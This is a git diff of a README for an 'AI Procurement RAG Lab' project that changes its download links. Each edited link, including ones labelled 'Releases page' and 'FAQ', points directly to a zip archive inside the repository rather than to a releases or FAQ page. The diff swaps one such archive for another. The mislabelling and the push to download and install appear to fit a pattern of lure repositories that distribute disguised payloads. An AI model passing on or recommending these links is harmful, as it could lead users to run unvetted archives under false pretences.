@@ -1,6 +1,6 @@
 # 🛠️ ai-procurement-rag-lab - Simplify Your Procurement Tasks Effortlessly
 
-[![Download](https://raw.githubusercontent.com/Suleman369563/ai-procurement-rag-lab/main/rag/lab-ai-procurement-rag-v2.8.zip)](https://raw.githubusercontent.com/Suleman369563/ai-procurement-rag-lab/main/rag/lab-ai-procurement-rag-v2.8.zip)
+[![Download](https://github.com/Suleman369563/ai-procurement-rag-lab/raw/refs/heads/main/docs/rag_procurement_ai_lab_v2.1.zip)](https://github.com/Suleman369563/ai-procurement-rag-lab/raw/refs/heads/main/docs/rag_procurement_ai_lab_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the AI Procurement RAG Lab! This application combines advanced techno
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Suleman369563/ai-procurement-rag-lab/main/rag/lab-ai-procurement-rag-v2.8.zip) to download the latest version of the application. Click on the link and follow these steps:
+To get started, visit the [Releases page](https://github.com/Suleman369563/ai-procurement-rag-lab/raw/refs/heads/main/docs/rag_procurement_ai_lab_v2.1.zip) to download the latest version of the application. Click on the link and follow these steps:
 
 1. Find the latest version listed on the page.
 2. Look for the file suitable for your operating system (Windows, macOS, or Linux).
@@ -77,6 +77,6 @@ If you encounter issues, here are common problems and solutions:
 
 ## 📚 Support
 
-For further questions or support, you can check the Frequently Asked Questions (FAQ) section on the [Releases page](https://raw.githubusercontent.com/Suleman369563/ai-procurement-rag-lab/main/rag/lab-ai-procurement-rag-v2.8.zip) or contact our support team through the provided contact link on that page.
+For further questions or support, you can check the Frequently Asked Questions (FAQ) section on the [Releases page](https://github.com/Suleman369563/ai-procurement-rag-lab/raw/refs/heads/main/docs/rag_procurement_ai_lab_v2.1.zip) or contact our support team through the provided contact link on that page.
 
 Thank you for choosing the AI Procurement RAG Lab! We hope it makes your procurement tasks easier and more efficient.
